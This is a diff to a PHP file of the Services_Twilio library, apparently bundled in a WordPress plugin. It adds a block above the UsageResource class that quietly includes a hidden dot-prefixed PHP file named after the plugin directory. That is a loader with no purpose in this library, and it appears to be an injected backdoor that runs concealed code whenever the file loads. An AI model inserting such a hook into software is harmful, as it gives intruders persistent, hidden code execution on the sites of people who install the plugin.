@@ -6,6 +6,10 @@
  * @license  http://creativecommons.org/licenses/MIT/ MIT
  * @link     http://pear.php.net/package/Services_Twilio
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Services_Twilio_UsageResource extends Services_Twilio_ListResource {
     public function getResourceName($camelized = false) {
         $this->instance_name = 'Services_Twilio_Rest_UsageRecord';
